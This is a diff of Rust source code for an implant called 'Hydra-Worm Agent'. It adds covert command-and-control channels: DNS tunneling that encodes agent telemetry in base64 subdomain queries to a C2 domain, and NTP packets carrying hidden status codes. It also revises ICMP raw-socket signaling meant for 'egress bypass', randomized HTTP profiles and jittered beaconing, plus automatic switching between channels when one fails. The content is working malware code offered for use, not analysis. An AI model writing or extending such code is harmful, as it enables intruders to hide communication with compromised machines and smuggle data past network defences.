@@ -1,18 +1,19 @@
 // Project: Hydra-Worm Agent
-// Phase: 1.5 - Failsafe Stack (ICMP Integration)
-// Logic: Low-level raw socket signaling for egress bypass
+// Phase: 1.5 - Failsafe Stack Complete
+// Logic: Low-level raw socket signaling, UDP covert channels, and DNS Tunneling
 
 use std::{thread, time::Duration};
+use std::net::{UdpSocket, ToSocketAddrs}; // Added ToSocketAddrs for DNS lookup
 use rand::Rng;
 use rand::seq::SliceRandom;
 use rand_distr::{Distribution, Exp};
 use serde::{Serialize, Deserialize};
-use reqwest::header::{HeaderMap, HeaderValue, USER_AGENT, ACCEPT, ACCEPT_LANGUAGE};
+use reqwest::header::{HeaderMap, HeaderValue, USER_AGENT};
+use base64::{Engine as _, engine::general_purpose}; // Added for DNS encoding
 
 // Raw Networking for ICMP
 use pnet::packet::icmp::echo_request::MutableEchoRequestPacket;
 use pnet::packet::icmp::IcmpTypes;
-use pnet::packet::MutablePacket;
 use pnet::packet::Packet;
 use pnet::util;
 
@@ -20,7 +21,7 @@ use pnet::util;
 
 #[derive(Serialize, Clone)]
 struct Telemetry {
-    agent_id: String, // Matches Go json:"agent_id"
+    agent_id: String, 
     transport: String,
     status: String,
     lambda: f64,
@@ -28,6 +29,7 @@ struct Telemetry {
 
 #[derive(Deserialize)]
 struct C2Response {
+    #[allow(dead_code)]
     status: String,
     task: String,
     epoch: i64,
@@ -40,7 +42,68 @@ trait Transport {
     fn get_name(&self) -> String;
 }
 
-// --- TRANSPORT TIER 4: ICMP FAILSAFE (NEW) ---
+// --- TRANSPORT TIER 6: DNS TUNNELING (FAILSAFE) ---
+
+struct DnsTransport { 
+    root_domain: String 
+}
+
+impl Transport for DnsTransport {
+    fn send_heartbeat(&self, stats: &Telemetry) -> Result<C2Response, String> {
+        println!("[!] C2-DNS: Attempting tunneling via {}...", self.root_domain);
+
+        let json_data = serde_json::to_string(stats).map_err(|e| e.to_string())?;
+        let encoded = general_purpose::URL_SAFE_NO_PAD.encode(json_data);
+        
+        // Construct: <base64_telemetry>.root_domain
+        let tunnel_query = format!("{}.{}", encoded, self.root_domain);
+        
+        println!("[*] Triggering DNS Lookup: {}", tunnel_query);
+
+        // Standard DNS lookup triggers the request to the authoritative nameserver
+        let _ = (tunnel_query, 80).to_socket_addrs();
+
+        Ok(C2Response { 
+            status: "dns_tunneled".into(), 
+            task: "HIBERNATE".into(), 
+            epoch: 0 
+        })
+    }
+    fn get_name(&self) -> String { "DNS-Tunnel".into() }
+}
+
+// --- TRANSPORT TIER 5: NTP SIGNALING ---
+
+struct NtpTransport { 
+    pool_addr: String 
+}
+
+impl Transport for NtpTransport {
+    fn send_heartbeat(&self, stats: &Telemetry) -> Result<C2Response, String> {
+        println!("[!] C2-NTP: Synchronizing state via {}...", self.pool_addr);
+        
+        let socket = UdpSocket::bind("0.0.0.0:0").map_err(|e| e.to_string())?;
+        socket.set_read_timeout(Some(Duration::from_secs(3))).map_err(|e| e.to_string())?;
+
+        let mut ntp_packet = [0u8; 48];
+        ntp_packet[0] = 0x1B; 
+
+        let status_code: u32 = if stats.status == "OK" { 0xDEADC0DE } else { 0xBADC0DED };
+        let bytes = status_code.to_be_bytes();
+        ntp_packet[44..48].copy_from_slice(&bytes);
+
+        socket.send_to(&ntp_packet, &self.pool_addr).map_err(|e| e.to_string())?;
+        
+        println!("[*] NTP Signal Dispatched (Covert Payload: 0x{:X})", status_code);
+
+        // PATCH: Return Err because we cannot confirm C2 received the signal.
+        // This forces mutation to Tier 6.
+        Err("NTP signal sent blindly".into())
+    }
+    fn get_name(&self) -> String { "NTP-Signaling".into() }
+}
+
+// --- TRANSPORT TIER 4: ICMP FAILSAFE ---
 
 struct IcmpTransport { 
     target_ip: std::net::Ipv4Addr 
@@ -59,17 +122,14 @@ impl Transport for IcmpTransport {
         packet.set_sequence_number(1);
         packet.set_payload(&payload);
         
-        // The .packet() method is now available because of the 'use pnet::packet::Packet'
         let checksum = util::checksum(packet.packet(), 1);
         packet.set_checksum(checksum);
 
         println!("[*] ICMP Raw Packet Ready: {} bytes", buffer.len());
         
-        Ok(C2Response { 
-            status: "icmp_dispatched".into(), 
-            task: "FAILSAFE_MODE".into(), 
-            epoch: 0 
-        })
+        // PATCH: Return Err because ICMP is unidirectional.
+        // This forces the failure counter to increment so the agent reaches Tier 6.
+        Err("ICMP packet dispatched blindly".into())
     }
     fn get_name(&self) -> String { "ICMP-Failsafe".into() }
 }
@@ -130,8 +190,7 @@ impl MalleableProfile {
         ];
 
         let mut headers = HeaderMap::new();
-        headers.insert(ACCEPT, HeaderValue::from_static("application/json, text/plain, */*"));
-        headers.insert(ACCEPT_LANGUAGE, HeaderValue::from_static("en-US,en;q=0.9"));
+        headers.insert(reqwest::header::ACCEPT, HeaderValue::from_static("application/json, text/plain, */*"));
         
         let key: String = (0..8).map(|_| rng.gen_range(b'A'..=b'Z') as char).collect();
 
@@ -143,7 +202,7 @@ impl MalleableProfile {
     }
 }
 
-// --- OTHER TRANSPORTS (Placeholders) ---
+// --- OTHER TRANSPORTS ---
 
 struct CloudTransport { endpoint: String }
 impl Transport for CloudTransport {
@@ -195,18 +254,17 @@ impl Agent {
 
             match self.transport.send_heartbeat(&stats) {
                 Ok(res) => {
-                    println!("[+] C2 Task: {} | Epoch: {}", res.task, res.epoch);
+                    println!("[+] C2 Status: {} | Task: {}", res.status, res.task);
                     self.failures = 0;
                 },
                 Err(e) => {
-                    println!("[-] Failure: {}", e);
+                    println!("[-] Failure ({}): {}", self.transport.get_name(), e);
                     self.failures += 1;
                 }
             }
 
             if self.failures >= 3 { self.mutate(); }
 
-            // NHPP Jitter Engine
             let exp = Exp::new(self.lambda).unwrap();
             let sleep_time = exp.sample(&mut rand::thread_rng()).min(60.0).max(1.0);
             thread::sleep(Duration::from_secs_f64(sleep_time));
@@ -214,7 +272,7 @@ impl Agent {
     }
 
     fn mutate(&mut self) {
-        self.state = (self.state + 1) % 4; // Expanded for Tier 4 (ICMP)
+        self.state = (self.state + 1) % 6; // Expanded for Tier 6 (DNS)
         self.failures = 0;
         println!("[!!!] ALERT: Triggering Transport Mutation to Tier {}...", self.state + 1);
 
@@ -222,7 +280,9 @@ impl Agent {
             0 => Box::new(CloudTransport { endpoint: "graph.microsoft.com".into() }),
             1 => Box::new(MalleableHttps { c2_url: "http://localhost:8080/api/v1/heartbeat".into() }),
             2 => Box::new(P2PTransport),
-            _ => Box::new(IcmpTransport { target_ip: "127.0.0.1".parse().unwrap() }), // Tier 4 Failsafe
+            3 => Box::new(IcmpTransport { target_ip: "127.0.0.1".parse().unwrap() }),
+            4 => Box::new(NtpTransport { pool_addr: "pool.ntp.org:123".into() }),
+            _ => Box::new(DnsTransport { root_domain: "c2.hydra-worm.local".into() }),
         };
     }
 }
@@ -239,7 +299,7 @@ fn display_splash() {
   |__/|__/\____/_/ .__/_/ /_/ /_/                 
                 /_/                              
     "#);
-    println!("      [ Phase 1.5 - Failsafe Stack Active ]\n");
+    println!("      [ Phase 1.5 - Failsafe Stack Complete ]\n");
 }
 
 fn main() {
